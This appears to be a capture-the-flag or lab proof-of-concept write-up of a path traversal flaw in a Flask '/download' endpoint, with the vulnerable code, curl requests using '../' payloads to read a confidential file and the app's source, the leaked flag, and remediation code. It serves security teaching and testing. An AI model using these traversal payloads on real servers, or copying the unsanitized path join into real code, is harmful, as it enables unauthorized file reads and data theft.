# PoC 5 — Path Traversal (`/download`)

**Flag:** `FLAG{traversal_dd53f986d659}`

## Vulnerability

`/download` joins the user-supplied `file` query parameter directly onto
a base directory with no sanitization:

```python
name = request.args.get("file", "welcome.txt")
path = os.path.join(APP_DIR, "public", name)
with open(path, "r") as fh:
    data = fh.read()
```

`os.path.join` does not strip `..` segments, so a relative path escaping
the intended `public/` directory is served as-is.

## Exploit

Baseline (intended use):

```bash
curl -s "http://127.0.0.1:5000/download?file=welcome.txt"
# Welcome to Vuln Hub. This file is meant to be downloadable.
```

Traversing out of `public/` to a sibling `private/` directory containing
a confidential file not linked anywhere in the app:

```bash
curl -s "http://127.0.0.1:5000/download?file=../private/employee_notes.txt"
```

**Response body:**

```
CONFIDENTIAL - employees only
If you can read this through the download endpoint, the path filter failed.
FLAG{traversal_dd53f986d659}
```

(The same technique, `?file=../app.py`, also serves the application's
own source code, confirming the traversal reaches arbitrary files
readable by the server process, not just this one confidential note.)

## Remediation

Resolve the requested path and verify it is still inside the intended
base directory before opening it, e.g.:

```python
base = os.path.realpath(os.path.join(APP_DIR, "public"))
target = os.path.realpath(os.path.join(base, name))
if not target.startswith(base + os.sep):
    return Response("File not found.", status=404, mimetype="text/plain")
```

Alternatively use `flask.send_from_directory`, which performs this check
internally and rejects traversal attempts.

**Severity:** High — arbitrary file read on the server's filesystem,
limited only by the OS-level permissions of the process running the app.
